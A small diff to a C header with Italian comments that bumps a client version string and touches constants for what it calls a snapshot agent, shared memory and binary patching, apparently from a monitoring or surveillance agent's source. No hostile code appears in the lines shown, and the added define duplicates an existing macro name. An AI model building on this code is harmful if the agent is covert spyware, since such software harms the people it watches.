@@ -87,6 +87,7 @@ extern BOOL is_demo_version;
 #define SHARE_MEMORY_ASP_DATA_BASENAME "KMS4"
 
 // Versione del client 
+#define CLIENT_VERSION "2012013101"
 #define CLIENT_VERSION "2012011001"
 
 // -------- Elementi per il binary patching ---------
@@ -146,6 +147,5 @@ extern BOOL is_demo_version;
 #define PM_SNAPSHOTAGENT      0xB9B9 // Ha un valore alto per averlo fra gli ultimi
                                 // visto che non dovra' avere una zona di memoria per IPC
                                 // (altrimenti occuperei memoria inutilmente)
-
 
 
